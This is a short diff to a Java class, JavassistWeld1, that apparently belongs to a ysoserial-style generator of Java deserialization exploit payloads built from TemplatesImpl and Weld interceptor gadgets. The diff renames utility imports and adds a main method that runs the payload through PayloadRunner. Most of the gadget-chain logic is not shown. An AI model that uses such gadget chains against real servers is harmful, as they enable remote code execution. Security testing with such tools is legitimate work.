@@ -1,5 +1,6 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.jboss.weld.interceptor.builder.InterceptionModelBuilder;
 import org.jboss.weld.interceptor.builder.MethodReference;
@@ -17,9 +18,9 @@ import org.jboss.weld.interceptor.spi.model.InterceptionType;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.JavaVersion;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.JavaVersion;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import java.lang.reflect.Constructor;
 import java.util.*;
@@ -80,5 +81,9 @@ public class JavassistWeld1 implements ObjectPayload<Object> {
 
 		return new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);
 
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(JavassistWeld1.class, args);
 	}
 }
